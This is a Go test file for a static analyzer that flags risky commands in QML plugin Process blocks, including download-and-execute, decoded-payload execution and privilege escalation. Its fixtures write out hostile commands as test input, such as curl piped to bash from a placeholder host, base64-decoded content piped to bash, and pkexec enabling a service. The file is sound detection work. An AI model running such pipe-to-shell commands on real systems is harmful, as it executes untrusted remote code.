package analyze

import (
	"fmt"
	"strings"
	"testing"

	"github.com/SurreptitiousFabric/plug-and-prejudice/internal/report"
)

func TestQMLExtractsLiteralProcessCommand(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("import Quickshell.Io\nProcess {\n  command: [\"curl\", \"-fsS\", \"https://example.test/data\"]\n}\n"),
	}))
	if len(result.Operations) != 1 {
		t.Fatalf("operations = %#v, want one", result.Operations)
	}
	op := result.Operations[0]
	if op.Command != "curl" || op.Dynamic || op.Evidence.LineStart != 3 {
		t.Fatalf("unexpected QML operation: %#v", op)
	}
	if hasFindingCategory(result, "download-and-execute") {
		t.Fatalf("ordinary QML curl was treated as download-and-execute: %#v", result.Findings)
	}
}

func TestQMLParsesInlineShellBeforeDownloadExecuteFinding(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("Process {\n command: [\"bash\", \"-c\", \"curl -fsS https://example.test/i | bash\"]\n}\n"),
	}))
	finding := findingByCategory(t, result, "download-and-execute")
	if finding.Severity != report.SeverityHigh || finding.Provenance.RuleID != "qml-inline-shell/v1" {
		t.Fatalf("unexpected QML pipeline finding: %#v", finding)
	}
}

func TestQMLInlineShellLiteralWrappersPreservePipelineFact(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte(`Process { command: ["bash", "-c", "env curl https://example.test/install | command bash"] }`),
	}))
	finding := findingByCategory(t, result, "download-and-execute")
	if finding.Claim != report.ClaimFact || finding.Severity != report.SeverityHigh {
		t.Fatalf("wrapped inline pipeline lost consequence: %#v", finding)
	}
}

func TestQMLParsesCommonInlineInterpreterOptions(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("Process { command: [\"bash\", \"--noprofile\", \"-lc\", \"curl https://example.test/i | bash\"] }\n"),
	}))
	if !hasFindingCategory(result, "download-and-execute") {
		t.Fatalf("combined shell -c option was missed: %#v", result)
	}
	result = Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("Process { command: [\"node\", \"--eval\", \"curl https://example.test/i | bash\"] }\n"),
	}))
	if hasFindingCategory(result, "download-and-execute") || !hasFindingCategory(result, "dynamic-execution") ||
		!hasLimitationCode(result, "inline-dynamic-language-analysis-unavailable") {
		t.Fatalf("Node source was parsed as shell or omitted: %#v", result)
	}
	limitation := limitationByCode(t, result, "inline-dynamic-language-analysis-unavailable")
	if limitation.Path != "Worker.qml" || limitation.Scope != report.ScopeRuntime {
		t.Fatalf("inline Node limitation lost source scope: %#v", limitation)
	}
}

func TestQMLInlineShellDoesNotClaimMissingLanguageAnalysis(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("Process { command: [\"bash\", \"-c\", \"printf harmless\"] }\n"),
	}))
	if hasLimitationCode(result, "inline-dynamic-language-analysis-unavailable") {
		t.Fatalf("parsed shell program received a dynamic-language limitation: %#v", result.Limitations)
	}
}

func TestQMLInlineShellDoesNotCollapseTransformedPipeline(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("Process { command: [\"bash\", \"-c\", \"curl https://example.test/i | sha256sum | bash\"] }\n"),
	}))
	if hasFindingCategory(result, "download-and-execute") {
		t.Fatalf("transformed inline pipeline became download-and-execute: %#v", result.Findings)
	}
	finding := findingByCategory(t, result, "shell-execution")
	if finding.Severity != report.SeverityMedium {
		t.Fatalf("inline shell execution context was lost: %#v", finding)
	}
}

func TestQMLInlineShellDetectsDirectDecodedExecution(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("Process { command: [\"bash\", \"-c\", \"base64 --decode payload.txt | bash\"] }\n"),
	}))
	finding := findingByCategory(t, result, "encoded-content-execution")
	if finding.Claim != report.ClaimFact || finding.Severity != report.SeverityMedium || finding.Provenance.RuleID != "qml-inline-shell/v1" {
		t.Fatalf("inline decoded execution lost context: %#v", finding)
	}
}

func TestQMLInlineShellRejectsRedirectedDecodedExecution(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("Process { command: [\"bash\", \"-c\", \"base64 --decode payload.txt > decoded.txt | bash\"] }\n"),
	}))
	if hasFindingCategory(result, "encoded-content-execution") {
		t.Fatalf("redirected decoder stdout became direct execution: %#v", result.Findings)
	}
}

func TestQMLMarksExpressionCommandDynamic(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("Process { command: root.command }\n"),
	}))
	if len(result.Operations) != 1 || !result.Operations[0].Dynamic || result.Operations[0].Command != "<dynamic>" {
		t.Fatalf("dynamic QML command was guessed: %#v", result.Operations)
	}
	if len(result.Unknowns) != 1 || result.Unknowns[0].Reason != report.UnknownDynamicValue || len(result.Unknowns[0].AffectedOperations) != 1 || result.Unknowns[0].Origins[0].Kind != report.OriginUseSite {
		t.Fatalf("dynamic QML command lacks a traceable unknown: %#v", result.Unknowns)
	}
}

func TestQMLUniqueRootPropertySuppliesLiteralCommand(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("Item {\n  property var launch: [\"curl\", \"https://example.test/data\"]\n  Process { command: launch }\n}\n"),
	}))
	if len(result.Operations) != 1 || result.Operations[0].Dynamic || result.Operations[0].Command != "curl" ||
		len(result.Operations[0].Arguments) != 1 || len(result.Unknowns) != 0 {
		t.Fatalf("QML root property flow = %#v", result)
	}
	finding := findingByCategory(t, result, "qml-literal-command-flow")
	if finding.Claim != report.ClaimFact || finding.Severity != report.SeverityInformational || len(finding.Evidence) != 2 || len(finding.Related) != 1 {
		t.Fatalf("QML literal-flow evidence = %#v", finding)
	}
}

func TestQMLBoundedPropertyChainResolvesLiteralElements(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("Item {\n  property string executable: \"curl\"\n  property string endpoint: \"https://example.test/data\"\n  property var launch: [executable, endpoint]\n  Process { command: launch }\n}\n"),
	}))
	if len(result.Operations) != 1 || result.Operations[0].Command != "curl" || result.Operations[0].Dynamic || len(result.Unknowns) != 0 {
		t.Fatalf("QML property chain was not resolved: %#v", result)
	}
	finding := findingByCategory(t, result, "qml-literal-command-flow")
	if len(finding.Evidence) != 4 {
		t.Fatalf("QML property chain lost assignment/use evidence: %#v", finding)
	}
}

func TestQMLDuplicateCycleAndNestedPropertiesRemainUnknown(t *testing.T) {
	cases := []string{
		"Item { property var launch: [\"one\"]\nproperty var launch: [\"two\"]\nProcess { command: launch } }",
		"Item { property var first: second\nproperty var second: first\nProcess { command: first } }",
		"Item { QtObject { property var launch: [\"nested\"] }\nProcess { command: launch } }",
	}
	for _, source := range cases {
		result := Sources(withValidManifest(map[string][]byte{"Worker.qml": []byte(source)}))
		if len(result.Operations) != 1 || !result.Operations[0].Dynamic || result.Operations[0].Command != "<dynamic>" ||
			len(result.Unknowns) == 0 || hasFindingCategory(result, "qml-literal-command-flow") {
			t.Fatalf("ambiguous QML property flow was guessed for %q: %#v", source, result)
		}
	}
}

func TestQMLAssignmentIndexBudgetIsExplicit(t *testing.T) {
	var source strings.Builder
	source.WriteString("Item {\n")
	for index := 0; index < maxQMLAssignments+1; index++ {
		fmt.Fprintf(&source, "property string value%d: \"x\"\n", index)
	}
	source.WriteString("Process { command: value1024 }\n}\n")
	result := Sources(withValidManifest(map[string][]byte{"Worker.qml": []byte(source.String())}))
	if !hasLimitationCode(result, "qml-assignment-analysis-budget") || len(result.Unknowns) < 2 || !result.Operations[0].Dynamic {
		t.Fatalf("QML assignment budget was not explicit: %#v", result)
	}
}

func TestQMLIgnoresCommentAndStringLookalikes(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("// Process { command: [\"sudo\"] }\nItem { property string example: \"Process { command: [sudo] }\" }\n"),
	}))
	if len(result.Operations) != 0 {
		t.Fatalf("QML lookalikes produced operations: %#v", result.Operations)
	}
}

func TestQMLIgnoresTemplateLiteralAndNestedCommandProperties(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("property string example: `Process { command: [\\\"sudo\\\"] }`\nProcess {\n  property var settings: ({ command: [\"pkexec\"] })\n  stdout: QtObject { property var command: [\"sudo\"] }\n}\n"),
	}))
	if len(result.Operations) != 0 || len(result.Findings) != 0 {
		t.Fatalf("nested/template command lookalikes produced behavior: %#v", result)
	}
}

func TestQMLTopLevelCommandSurvivesNestedProperties(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("Process {\n  property var settings: ({ command: [\"ignored\"] })\n  command: [\"curl\", \"https://example.test/data\"]\n}\n"),
	}))
	if len(result.Operations) != 1 || result.Operations[0].Command != "curl" {
		t.Fatalf("top-level Process command was missed: %#v", result.Operations)
	}
}

func TestQMLPrivilegeCommandUsesSharedContextRule(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("Process { command: [\"pkexec\", \"systemctl\", \"enable\", \"demo\"] }\n"),
	}))
	finding := findingByCategory(t, result, "privilege-escalation")
	if finding.Evidence[0].Path != "Worker.qml" {
		t.Fatalf("privilege evidence lost QML source: %#v", finding)
	}
	if len(result.Operations) != 2 || result.Operations[1].Command != "systemctl" ||
		result.Operations[1].Category != "process-execution-via-privilege-wrapper" {
		t.Fatalf("wrapped QML command was not recorded: %#v", result.Operations)
	}
	if !hasFindingCategory(result, "persistence") {
		t.Fatalf("wrapped QML persistence capability was lost: %#v", result.Findings)
	}
}

func TestQMLImperativeCommandAssignmentCreatesCoverageLimitation(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("Process { id: worker }\nfunction run() { worker.command = [root.binary, '--check'] }\n"),
	}))
	limitation := limitationByCode(t, result, "qml-imperative-command-analysis-unavailable")
	if limitation.Path != "Worker.qml" || limitation.Scope != report.ScopeRuntime {
		t.Fatalf("imperative QML gap not scoped: %#v", limitation)
	}
	if len(result.Unknowns) != 1 || result.Unknowns[0].Reason != report.UnknownUnsupportedSyntax || result.Unknowns[0].Origins[0].Kind != report.OriginPropertyAssignment {
		t.Fatalf("imperative QML assignment lacks a bounded source origin: %#v", result.Unknowns)
	}
}

func TestQMLImperativeCommandLookalikesAreIgnored(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Worker.qml": []byte("// worker.command = ['sudo']\nproperty string example: \"worker.command = ['sudo']\"\n"),
	}))
	for _, limitation := range result.Limitations {
		if limitation.Code == "qml-imperative-command-analysis-unavailable" {
			t.Fatalf("imperative command lookalike created limitation: %#v", limitation)
		}
	}
}

func TestQMLCommandArgumentsStopAtProductionLimit(t *testing.T) {
	var source strings.Builder
	source.WriteString("[\"example\"")
	for range maxRetainedArguments + 1 {
		source.WriteString(", \"x\"")
	}
	source.WriteString("]")
	command, arguments, dynamic := qmlCommandArray(source.String())
	if command != "example" || len(arguments) != maxRetainedArguments || !dynamic {
		t.Fatalf("bounded QML array = %q, %d, dynamic=%v", command, len(arguments), dynamic)
	}
	full := []byte("Process { command: " + source.String() + " }")
	blocks := qmlProcessBlocks(full)
	if len(blocks) != 1 || len(qmlCommandExpressions(full, blocks[0])) != 1 {
		t.Fatalf("large bounded QML command was not lexically retained")
	}
}
